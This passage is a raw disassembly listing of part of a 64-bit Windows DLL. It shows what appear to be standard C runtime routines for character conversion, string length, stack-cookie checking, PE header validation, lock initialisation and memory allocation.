   18000578b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005790:	48 83 c4 20          	add    $0x20,%rsp
   180005794:	5f                   	pop    %rdi
   180005795:	c3                   	ret
   180005796:	cc                   	int3
   180005797:	cc                   	int3
   180005798:	48 8b 0d d1 77 00 00 	mov    0x77d1(%rip),%rcx        # 0x18000cf70
   18000579f:	33 c0                	xor    %eax,%eax
   1800057a1:	48 83 c9 01          	or     $0x1,%rcx
   1800057a5:	48 39 0d cc 7d 00 00 	cmp    %rcx,0x7dcc(%rip)        # 0x18000d578
   1800057ac:	0f 94 c0             	sete   %al
   1800057af:	c3                   	ret
   1800057b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800057b5:	66 44 89 4c 24 20    	mov    %r9w,0x20(%rsp)
   1800057bb:	55                   	push   %rbp
   1800057bc:	56                   	push   %rsi
   1800057bd:	57                   	push   %rdi
   1800057be:	48 8b ec             	mov    %rsp,%rbp
   1800057c1:	48 83 ec 60          	sub    $0x60,%rsp
   1800057c5:	49 8b f8             	mov    %r8,%rdi
   1800057c8:	48 8b f2             	mov    %rdx,%rsi
   1800057cb:	48 8b d9             	mov    %rcx,%rbx
   1800057ce:	48 85 d2             	test   %rdx,%rdx
   1800057d1:	75 13                	jne    0x1800057e6
   1800057d3:	4d 85 c0             	test   %r8,%r8
   1800057d6:	74 0e                	je     0x1800057e6
   1800057d8:	48 85 c9             	test   %rcx,%rcx
   1800057db:	74 02                	je     0x1800057df
   1800057dd:	21 11                	and    %edx,(%rcx)
   1800057df:	33 c0                	xor    %eax,%eax
   1800057e1:	e9 8a 00 00 00       	jmp    0x180005870
   1800057e6:	48 85 c9             	test   %rcx,%rcx
   1800057e9:	74 03                	je     0x1800057ee
   1800057eb:	83 09 ff             	orl    $0xffffffff,(%rcx)
   1800057ee:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   1800057f5:	76 15                	jbe    0x18000580c
   1800057f7:	e8 a4 ce ff ff       	call   0x1800026a0
   1800057fc:	bb 16 00 00 00       	mov    $0x16,%ebx
   180005801:	89 18                	mov    %ebx,(%rax)
   180005803:	e8 30 ce ff ff       	call   0x180002638
   180005808:	8b c3                	mov    %ebx,%eax
   18000580a:	eb 64                	jmp    0x180005870
   18000580c:	48 8b 55 40          	mov    0x40(%rbp),%rdx
   180005810:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180005814:	e8 a3 bf ff ff       	call   0x1800017bc
   180005819:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
   18000581d:	41 83 7b 14 00       	cmpl   $0x0,0x14(%r11)
   180005822:	0f 85 b2 00 00 00    	jne    0x1800058da
   180005828:	0f b7 45 38          	movzwl 0x38(%rbp),%eax
   18000582c:	b9 ff 00 00 00       	mov    $0xff,%ecx
   180005831:	66 3b c1             	cmp    %cx,%ax
   180005834:	76 4a                	jbe    0x180005880
   180005836:	48 85 f6             	test   %rsi,%rsi
   180005839:	74 12                	je     0x18000584d
   18000583b:	48 85 ff             	test   %rdi,%rdi
   18000583e:	74 0d                	je     0x18000584d
   180005840:	4c 8b c7             	mov    %rdi,%r8
   180005843:	33 d2                	xor    %edx,%edx
   180005845:	48 8b ce             	mov    %rsi,%rcx
   180005848:	e8 a3 b9 ff ff       	call   0x1800011f0
   18000584d:	e8 4e ce ff ff       	call   0x1800026a0
   180005852:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   180005858:	e8 43 ce ff ff       	call   0x1800026a0
   18000585d:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   180005861:	8b 00                	mov    (%rax),%eax
   180005863:	74 0b                	je     0x180005870
   180005865:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   180005869:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180005870:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   180005877:	00 
   180005878:	48 83 c4 60          	add    $0x60,%rsp
   18000587c:	5f                   	pop    %rdi
   18000587d:	5e                   	pop    %rsi
   18000587e:	5d                   	pop    %rbp
   18000587f:	c3                   	ret
   180005880:	48 85 f6             	test   %rsi,%rsi
   180005883:	74 30                	je     0x1800058b5
   180005885:	48 85 ff             	test   %rdi,%rdi
   180005888:	75 29                	jne    0x1800058b3
   18000588a:	e8 11 ce ff ff       	call   0x1800026a0
   18000588f:	8d 5f 22             	lea    0x22(%rdi),%ebx
   180005892:	89 18                	mov    %ebx,(%rax)
   180005894:	e8 9f cd ff ff       	call   0x180002638
   180005899:	40 38 7d f8          	cmp    %dil,-0x8(%rbp)
   18000589d:	0f 84 65 ff ff ff    	je     0x180005808
   1800058a3:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1800058a7:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1800058ae:	e9 55 ff ff ff       	jmp    0x180005808
   1800058b3:	88 06                	mov    %al,(%rsi)
   1800058b5:	48 85 db             	test   %rbx,%rbx
   1800058b8:	74 06                	je     0x1800058c0
   1800058ba:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1800058c0:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   1800058c4:	0f 84 15 ff ff ff    	je     0x1800057df
   1800058ca:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1800058ce:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1800058d5:	e9 05 ff ff ff       	jmp    0x1800057df
   1800058da:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   1800058de:	41 8b 4b 04          	mov    0x4(%r11),%ecx
   1800058e2:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1800058e6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800058eb:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1800058f1:	4c 8d 45 38          	lea    0x38(%rbp),%r8
   1800058f5:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800058fb:	33 d2                	xor    %edx,%edx
   1800058fd:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180005901:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180005906:	ff 15 34 38 00 00    	call   *0x3834(%rip)        # 0x180009140
   18000590c:	85 c0                	test   %eax,%eax
   18000590e:	74 13                	je     0x180005923
   180005910:	83 7d 28 00          	cmpl   $0x0,0x28(%rbp)
   180005914:	0f 85 33 ff ff ff    	jne    0x18000584d
   18000591a:	48 85 db             	test   %rbx,%rbx
   18000591d:	74 a1                	je     0x1800058c0
   18000591f:	89 03                	mov    %eax,(%rbx)
   180005921:	eb 9d                	jmp    0x1800058c0
   180005923:	ff 15 9f 37 00 00    	call   *0x379f(%rip)        # 0x1800090c8
   180005929:	83 f8 7a             	cmp    $0x7a,%eax
   18000592c:	0f 85 1b ff ff ff    	jne    0x18000584d
   180005932:	48 85 f6             	test   %rsi,%rsi
   180005935:	74 12                	je     0x180005949
   180005937:	48 85 ff             	test   %rdi,%rdi
   18000593a:	74 0d                	je     0x180005949
   18000593c:	4c 8b c7             	mov    %rdi,%r8
   18000593f:	33 d2                	xor    %edx,%edx
   180005941:	48 8b ce             	mov    %rsi,%rcx
   180005944:	e8 a7 b8 ff ff       	call   0x1800011f0
   180005949:	e8 52 cd ff ff       	call   0x1800026a0
   18000594e:	bb 22 00 00 00       	mov    $0x22,%ebx
   180005953:	89 18                	mov    %ebx,(%rax)
   180005955:	e8 de cc ff ff       	call   0x180002638
   18000595a:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   18000595e:	0f 84 a4 fe ff ff    	je     0x180005808
   180005964:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   180005968:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   18000596f:	e9 94 fe ff ff       	jmp    0x180005808
   180005974:	48 83 ec 38          	sub    $0x38,%rsp
   180005978:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000597e:	e8 2d fe ff ff       	call   0x1800057b0
   180005983:	48 83 c4 38          	add    $0x38,%rsp
   180005987:	c3                   	ret
   180005988:	cc                   	int3
   180005989:	cc                   	int3
   18000598a:	cc                   	int3
   18000598b:	cc                   	int3
   18000598c:	cc                   	int3
   18000598d:	cc                   	int3
   18000598e:	cc                   	int3
   18000598f:	cc                   	int3
   180005990:	cc                   	int3
   180005991:	cc                   	int3
   180005992:	cc                   	int3
   180005993:	cc                   	int3
   180005994:	cc                   	int3
   180005995:	cc                   	int3
   180005996:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000599d:	00 00 00 
   1800059a0:	48 8b c1             	mov    %rcx,%rax
   1800059a3:	48 f7 d9             	neg    %rcx
   1800059a6:	48 a9 07 00 00 00    	test   $0x7,%rax
   1800059ac:	74 0f                	je     0x1800059bd
   1800059ae:	66 90                	xchg   %ax,%ax
   1800059b0:	8a 10                	mov    (%rax),%dl
   1800059b2:	48 ff c0             	inc    %rax
   1800059b5:	84 d2                	test   %dl,%dl
   1800059b7:	74 5f                	je     0x180005a18
   1800059b9:	a8 07                	test   $0x7,%al
   1800059bb:	75 f3                	jne    0x1800059b0
   1800059bd:	49 b8 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r8
   1800059c4:	fe fe 7e 
   1800059c7:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   1800059ce:	01 01 81 
   1800059d1:	48 8b 10             	mov    (%rax),%rdx
   1800059d4:	4d 8b c8             	mov    %r8,%r9
   1800059d7:	48 83 c0 08          	add    $0x8,%rax
   1800059db:	4c 03 ca             	add    %rdx,%r9
   1800059de:	48 f7 d2             	not    %rdx
   1800059e1:	49 33 d1             	xor    %r9,%rdx
   1800059e4:	49 23 d3             	and    %r11,%rdx
   1800059e7:	74 e8                	je     0x1800059d1
   1800059e9:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   1800059ed:	84 d2                	test   %dl,%dl
   1800059ef:	74 51                	je     0x180005a42
   1800059f1:	84 f6                	test   %dh,%dh
   1800059f3:	74 47                	je     0x180005a3c
   1800059f5:	48 c1 ea 10          	shr    $0x10,%rdx
   1800059f9:	84 d2                	test   %dl,%dl
   1800059fb:	74 39                	je     0x180005a36
   1800059fd:	84 f6                	test   %dh,%dh
   1800059ff:	74 2f                	je     0x180005a30
   180005a01:	48 c1 ea 10          	shr    $0x10,%rdx
   180005a05:	84 d2                	test   %dl,%dl
   180005a07:	74 21                	je     0x180005a2a
   180005a09:	84 f6                	test   %dh,%dh
   180005a0b:	74 17                	je     0x180005a24
   180005a0d:	c1 ea 10             	shr    $0x10,%edx
   180005a10:	84 d2                	test   %dl,%dl
   180005a12:	74 0a                	je     0x180005a1e
   180005a14:	84 f6                	test   %dh,%dh
   180005a16:	75 b9                	jne    0x1800059d1
   180005a18:	48 8d 44 01 ff       	lea    -0x1(%rcx,%rax,1),%rax
   180005a1d:	c3                   	ret
   180005a1e:	48 8d 44 01 fe       	lea    -0x2(%rcx,%rax,1),%rax
   180005a23:	c3                   	ret
   180005a24:	48 8d 44 01 fd       	lea    -0x3(%rcx,%rax,1),%rax
   180005a29:	c3                   	ret
   180005a2a:	48 8d 44 01 fc       	lea    -0x4(%rcx,%rax,1),%rax
   180005a2f:	c3                   	ret
   180005a30:	48 8d 44 01 fb       	lea    -0x5(%rcx,%rax,1),%rax
   180005a35:	c3                   	ret
   180005a36:	48 8d 44 01 fa       	lea    -0x6(%rcx,%rax,1),%rax
   180005a3b:	c3                   	ret
   180005a3c:	48 8d 44 01 f9       	lea    -0x7(%rcx,%rax,1),%rax
   180005a41:	c3                   	ret
   180005a42:	48 8d 44 01 f8       	lea    -0x8(%rcx,%rax,1),%rax
   180005a47:	c3                   	ret
   180005a48:	cc                   	int3
   180005a49:	cc                   	int3
   180005a4a:	cc                   	int3
   180005a4b:	cc                   	int3
   180005a4c:	cc                   	int3
   180005a4d:	cc                   	int3
   180005a4e:	cc                   	int3
   180005a4f:	cc                   	int3
   180005a50:	cc                   	int3
   180005a51:	cc                   	int3
   180005a52:	cc                   	int3
   180005a53:	cc                   	int3
   180005a54:	cc                   	int3
   180005a55:	cc                   	int3
   180005a56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005a5d:	00 00 00 
   180005a60:	48 3b 0d 09 75 00 00 	cmp    0x7509(%rip),%rcx        # 0x18000cf70
   180005a67:	75 11                	jne    0x180005a7a
   180005a69:	48 c1 c1 10          	rol    $0x10,%rcx
   180005a6d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180005a72:	75 02                	jne    0x180005a76
   180005a74:	f3 c3                	repz ret
   180005a76:	48 c1 c9 10          	ror    $0x10,%rcx
   180005a7a:	e9 89 22 00 00       	jmp    0x180007d08
   180005a7f:	cc                   	int3
   180005a80:	83 25 5d 89 00 00 00 	andl   $0x0,0x895d(%rip)        # 0x18000e3e4
   180005a87:	c3                   	ret
   180005a88:	cc                   	int3
   180005a89:	cc                   	int3
   180005a8a:	cc                   	int3
   180005a8b:	cc                   	int3
   180005a8c:	cc                   	int3
   180005a8d:	cc                   	int3
   180005a8e:	cc                   	int3
   180005a8f:	cc                   	int3
   180005a90:	cc                   	int3
   180005a91:	cc                   	int3
   180005a92:	cc                   	int3
   180005a93:	cc                   	int3
   180005a94:	cc                   	int3
   180005a95:	cc                   	int3
   180005a96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005a9d:	00 00 00 
   180005aa0:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   180005aa7:	4d 33 c0             	xor    %r8,%r8
   180005aaa:	4d 33 c9             	xor    %r9,%r9
   180005aad:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   180005ab2:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   180005ab7:	e8 86 2e 00 00       	call   0x180008942
   180005abc:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   180005ac3:	c3                   	ret
   180005ac4:	cc                   	int3
   180005ac5:	cc                   	int3
   180005ac6:	cc                   	int3
   180005ac7:	cc                   	int3
   180005ac8:	cc                   	int3
   180005ac9:	cc                   	int3
   180005aca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180005ad0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180005ad5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   180005ada:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   180005adf:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   180005ae6:	eb 08                	jmp    0x180005af0
   180005ae8:	cc                   	int3
   180005ae9:	cc                   	int3
   180005aea:	cc                   	int3
   180005aeb:	cc                   	int3
   180005aec:	cc                   	int3
   180005aed:	cc                   	int3
   180005aee:	66 90                	xchg   %ax,%ax
   180005af0:	c3                   	ret
   180005af1:	cc                   	int3
   180005af2:	cc                   	int3
   180005af3:	cc                   	int3
   180005af4:	cc                   	int3
   180005af5:	cc                   	int3
   180005af6:	cc                   	int3
   180005af7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180005afe:	00 00 
   180005b00:	c3                   	ret
   180005b01:	cc                   	int3
   180005b02:	cc                   	int3
   180005b03:	cc                   	int3
   180005b04:	cc                   	int3
   180005b05:	cc                   	int3
   180005b06:	cc                   	int3
   180005b07:	cc                   	int3
   180005b08:	cc                   	int3
   180005b09:	cc                   	int3
   180005b0a:	cc                   	int3
   180005b0b:	cc                   	int3
   180005b0c:	cc                   	int3
   180005b0d:	cc                   	int3
   180005b0e:	cc                   	int3
   180005b0f:	cc                   	int3
   180005b10:	48 8b c1             	mov    %rcx,%rax
   180005b13:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   180005b18:	66 39 08             	cmp    %cx,(%rax)
   180005b1b:	74 03                	je     0x180005b20
   180005b1d:	33 c0                	xor    %eax,%eax
   180005b1f:	c3                   	ret
   180005b20:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   180005b24:	48 03 c8             	add    %rax,%rcx
   180005b27:	33 c0                	xor    %eax,%eax
   180005b29:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180005b2f:	75 0c                	jne    0x180005b3d
   180005b31:	ba 0b 02 00 00       	mov    $0x20b,%edx
   180005b36:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   180005b3a:	0f 94 c0             	sete   %al
   180005b3d:	f3 c3                	repz ret
   180005b3f:	cc                   	int3
   180005b40:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   180005b44:	45 33 c9             	xor    %r9d,%r9d
   180005b47:	4c 8b d2             	mov    %rdx,%r10
   180005b4a:	4c 03 c1             	add    %rcx,%r8
   180005b4d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   180005b52:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   180005b57:	4a 8d 4c 00 18       	lea    0x18(%rax,%r8,1),%rcx
   180005b5c:	45 85 db             	test   %r11d,%r11d
   180005b5f:	74 1e                	je     0x180005b7f
   180005b61:	8b 51 0c             	mov    0xc(%rcx),%edx
   180005b64:	4c 3b d2             	cmp    %rdx,%r10
   180005b67:	72 0a                	jb     0x180005b73
   180005b69:	8b 41 08             	mov    0x8(%rcx),%eax
   180005b6c:	03 c2                	add    %edx,%eax
   180005b6e:	4c 3b d0             	cmp    %rax,%r10
   180005b71:	72 0f                	jb     0x180005b82
   180005b73:	41 ff c1             	inc    %r9d
   180005b76:	48 83 c1 28          	add    $0x28,%rcx
   180005b7a:	45 3b cb             	cmp    %r11d,%r9d
   180005b7d:	72 e2                	jb     0x180005b61
   180005b7f:	33 c0                	xor    %eax,%eax
   180005b81:	c3                   	ret
   180005b82:	48 8b c1             	mov    %rcx,%rax
   180005b85:	c3                   	ret
   180005b86:	cc                   	int3
   180005b87:	cc                   	int3
   180005b88:	cc                   	int3
   180005b89:	cc                   	int3
   180005b8a:	cc                   	int3
   180005b8b:	cc                   	int3
   180005b8c:	cc                   	int3
   180005b8d:	cc                   	int3
   180005b8e:	cc                   	int3
   180005b8f:	cc                   	int3
   180005b90:	48 83 ec 28          	sub    $0x28,%rsp
   180005b94:	4c 8b c1             	mov    %rcx,%r8
   180005b97:	4c 8d 0d 62 a4 ff ff 	lea    -0x5b9e(%rip),%r9        # 0x180000000
   180005b9e:	49 8b c9             	mov    %r9,%rcx
   180005ba1:	e8 6a ff ff ff       	call   0x180005b10
   180005ba6:	85 c0                	test   %eax,%eax
   180005ba8:	74 22                	je     0x180005bcc
   180005baa:	4d 2b c1             	sub    %r9,%r8
   180005bad:	49 8b d0             	mov    %r8,%rdx
   180005bb0:	49 8b c9             	mov    %r9,%rcx
   180005bb3:	e8 88 ff ff ff       	call   0x180005b40
   180005bb8:	48 85 c0             	test   %rax,%rax
   180005bbb:	74 0f                	je     0x180005bcc
   180005bbd:	8b 40 24             	mov    0x24(%rax),%eax
   180005bc0:	c1 e8 1f             	shr    $0x1f,%eax
   180005bc3:	f7 d0                	not    %eax
   180005bc5:	83 e0 01             	and    $0x1,%eax
   180005bc8:	eb 02                	jmp    0x180005bcc
   180005bca:	33 c0                	xor    %eax,%eax
   180005bcc:	48 83 c4 28          	add    $0x28,%rsp
   180005bd0:	c3                   	ret
   180005bd1:	cc                   	int3
   180005bd2:	cc                   	int3
   180005bd3:	cc                   	int3
   180005bd4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005bd9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005bde:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180005be3:	41 54                	push   %r12
   180005be5:	48 83 ec 20          	sub    $0x20,%rsp
   180005be9:	4c 8d 25 90 73 00 00 	lea    0x7390(%rip),%r12        # 0x18000cf80
   180005bf0:	33 f6                	xor    %esi,%esi
   180005bf2:	33 db                	xor    %ebx,%ebx
   180005bf4:	49 8b fc             	mov    %r12,%rdi
   180005bf7:	83 7f 08 01          	cmpl   $0x1,0x8(%rdi)
   180005bfb:	75 26                	jne    0x180005c23
   180005bfd:	48 63 c6             	movslq %esi,%rax
   180005c00:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   180005c05:	ff c6                	inc    %esi
   180005c07:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180005c0b:	48 8d 05 6e 79 00 00 	lea    0x796e(%rip),%rax        # 0x18000d580
   180005c12:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   180005c16:	48 89 0f             	mov    %rcx,(%rdi)
   180005c19:	ff 15 f1 34 00 00    	call   *0x34f1(%rip)        # 0x180009110
   180005c1f:	85 c0                	test   %eax,%eax
   180005c21:	74 26                	je     0x180005c49
   180005c23:	ff c3                	inc    %ebx
   180005c25:	48 83 c7 10          	add    $0x10,%rdi
   180005c29:	83 fb 24             	cmp    $0x24,%ebx
   180005c2c:	7c c9                	jl     0x180005bf7
   180005c2e:	b8 01 00 00 00       	mov    $0x1,%eax
   180005c33:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005c38:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005c3d:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180005c42:	48 83 c4 20          	add    $0x20,%rsp
   180005c46:	41 5c                	pop    %r12
   180005c48:	c3                   	ret
   180005c49:	48 63 c3             	movslq %ebx,%rax
   180005c4c:	48 03 c0             	add    %rax,%rax
   180005c4f:	49 83 24 c4 00       	andq   $0x0,(%r12,%rax,8)
   180005c54:	33 c0                	xor    %eax,%eax
   180005c56:	eb db                	jmp    0x180005c33
   180005c58:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005c5d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180005c62:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180005c67:	57                   	push   %rdi
   180005c68:	48 83 ec 20          	sub    $0x20,%rsp
   180005c6c:	bf 24 00 00 00       	mov    $0x24,%edi
   180005c71:	48 8d 1d 08 73 00 00 	lea    0x7308(%rip),%rbx        # 0x18000cf80
   180005c78:	8b f7                	mov    %edi,%esi
   180005c7a:	48 8b 2b             	mov    (%rbx),%rbp
   180005c7d:	48 85 ed             	test   %rbp,%rbp
   180005c80:	74 1b                	je     0x180005c9d
   180005c82:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   180005c86:	74 15                	je     0x180005c9d
   180005c88:	48 8b cd             	mov    %rbp,%rcx
   180005c8b:	ff 15 97 34 00 00    	call   *0x3497(%rip)        # 0x180009128
   180005c91:	48 8b cd             	mov    %rbp,%rcx
   180005c94:	e8 1f d0 ff ff       	call   0x180002cb8
   180005c99:	48 83 23 00          	andq   $0x0,(%rbx)
   180005c9d:	48 83 c3 10          	add    $0x10,%rbx
   180005ca1:	48 ff ce             	dec    %rsi
   180005ca4:	75 d4                	jne    0x180005c7a
   180005ca6:	48 8d 1d db 72 00 00 	lea    0x72db(%rip),%rbx        # 0x18000cf88
   180005cad:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   180005cb1:	48 85 c9             	test   %rcx,%rcx
   180005cb4:	74 0b                	je     0x180005cc1
   180005cb6:	83 3b 01             	cmpl   $0x1,(%rbx)
   180005cb9:	75 06                	jne    0x180005cc1
   180005cbb:	ff 15 67 34 00 00    	call   *0x3467(%rip)        # 0x180009128
   180005cc1:	48 83 c3 10          	add    $0x10,%rbx
   180005cc5:	48 ff cf             	dec    %rdi
   180005cc8:	75 e3                	jne    0x180005cad
   180005cca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005ccf:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180005cd4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180005cd9:	48 83 c4 20          	add    $0x20,%rsp
   180005cdd:	5f                   	pop    %rdi
   180005cde:	c3                   	ret
   180005cdf:	cc                   	int3
   180005ce0:	48 63 c9             	movslq %ecx,%rcx
   180005ce3:	48 8d 05 96 72 00 00 	lea    0x7296(%rip),%rax        # 0x18000cf80
   180005cea:	48 03 c9             	add    %rcx,%rcx
   180005ced:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   180005cf1:	48 ff 25 b8 34 00 00 	rex.W jmp *0x34b8(%rip)        # 0x1800091b0
   180005cf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005cfd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005d02:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180005d07:	41 55                	push   %r13
   180005d09:	48 83 ec 20          	sub    $0x20,%rsp
   180005d0d:	48 63 d9             	movslq %ecx,%rbx
   180005d10:	be 01 00 00 00       	mov    $0x1,%esi
   180005d15:	48 83 3d 2b 78 00 00 	cmpq   $0x0,0x782b(%rip)        # 0x18000d548
   180005d1c:	00 
   180005d1d:	75 17                	jne    0x180005d36
   180005d1f:	e8 10 0a 00 00       	call   0x180006734
   180005d24:	8d 4e 1d             	lea    0x1d(%rsi),%ecx
   180005d27:	e8 a8 07 00 00       	call   0x1800064d4
   180005d2c:	b9 ff 00 00 00       	mov    $0xff,%ecx
   180005d31:	e8 8a d1 ff ff       	call   0x180002ec0
   180005d36:	48 8b fb             	mov    %rbx,%rdi
   180005d39:	48 03 ff             	add    %rdi,%rdi
   180005d3c:	4c 8d 2d 3d 72 00 00 	lea    0x723d(%rip),%r13        # 0x18000cf80
   180005d43:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   180005d49:	74 04                	je     0x180005d4f
   180005d4b:	8b c6                	mov    %esi,%eax
   180005d4d:	eb 79                	jmp    0x180005dc8
   180005d4f:	b9 28 00 00 00       	mov    $0x28,%ecx
   180005d54:	e8 9f cf ff ff       	call   0x180002cf8
   180005d59:	48 8b d8             	mov    %rax,%rbx
   180005d5c:	48 85 c0             	test   %rax,%rax
   180005d5f:	75 0f                	jne    0x180005d70
   180005d61:	e8 3a c9 ff ff       	call   0x1800026a0
   180005d66:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005d6c:	33 c0                	xor    %eax,%eax
   180005d6e:	eb 58                	jmp    0x180005dc8
   180005d70:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180005d75:	e8 66 00 00 00       	call   0x180005de0
   180005d7a:	90                   	nop
   180005d7b:	48 8b cb             	mov    %rbx,%rcx
   180005d7e:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   180005d84:	75 2d                	jne    0x180005db3
   180005d86:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   180005d8b:	ff 15 7f 33 00 00    	call   *0x337f(%rip)        # 0x180009110
   180005d91:	85 c0                	test   %eax,%eax
   180005d93:	75 17                	jne    0x180005dac
   180005d95:	48 8b cb             	mov    %rbx,%rcx
   180005d98:	e8 1b cf ff ff       	call   0x180002cb8
   180005d9d:	e8 fe c8 ff ff       	call   0x1800026a0
   180005da2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005da8:	33 f6                	xor    %esi,%esi
   180005daa:	eb 0d                	jmp    0x180005db9
   180005dac:	49 89 5c fd 00       	mov    %rbx,0x0(%r13,%rdi,8)
   180005db1:	eb 06                	jmp    0x180005db9
   180005db3:	e8 00 cf ff ff       	call   0x180002cb8
   180005db8:	90                   	nop
   180005db9:	48 8b 0d 60 72 00 00 	mov    0x7260(%rip),%rcx        # 0x18000d020
   180005dc0:	ff 15 ea 33 00 00    	call   *0x33ea(%rip)        # 0x1800091b0
   180005dc6:	eb 83                	jmp    0x180005d4b
   180005dc8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005dcd:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005dd2:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180005dd7:	48 83 c4 20          	add    $0x20,%rsp
   180005ddb:	41 5d                	pop    %r13
   180005ddd:	c3                   	ret
   180005dde:	cc                   	int3
   180005ddf:	cc                   	int3
   180005de0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005de5:	57                   	push   %rdi
   180005de6:	48 83 ec 20          	sub    $0x20,%rsp
   180005dea:	48 63 d9             	movslq %ecx,%rbx
   180005ded:	48 8d 3d 8c 71 00 00 	lea    0x718c(%rip),%rdi        # 0x18000cf80
   180005df4:	48 03 db             	add    %rbx,%rbx
   180005df7:	48 83 3c df 00       	cmpq   $0x0,(%rdi,%rbx,8)
   180005dfc:	75 11                	jne    0x180005e0f
   180005dfe:	e8 f5 fe ff ff       	call   0x180005cf8
   180005e03:	85 c0                	test   %eax,%eax
   180005e05:	75 08                	jne    0x180005e0f
   180005e07:	8d 48 11             	lea    0x11(%rax),%ecx
   180005e0a:	e8 f1 d3 ff ff       	call   0x180003200
   180005e0f:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
   180005e13:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005e18:	48 83 c4 20          	add    $0x20,%rsp
   180005e1c:	5f                   	pop    %rdi
   180005e1d:	48 ff 25 84 33 00 00 	rex.W jmp *0x3384(%rip)        # 0x1800091a8
   180005e24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005e29:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005e2e:	57                   	push   %rdi
   180005e2f:	48 83 ec 20          	sub    $0x20,%rsp
   180005e33:	48 8b d9             	mov    %rcx,%rbx
   180005e36:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   180005e3a:	77 7c                	ja     0x180005eb8
   180005e3c:	bf 01 00 00 00       	mov    $0x1,%edi
   180005e41:	48 85 c9             	test   %rcx,%rcx
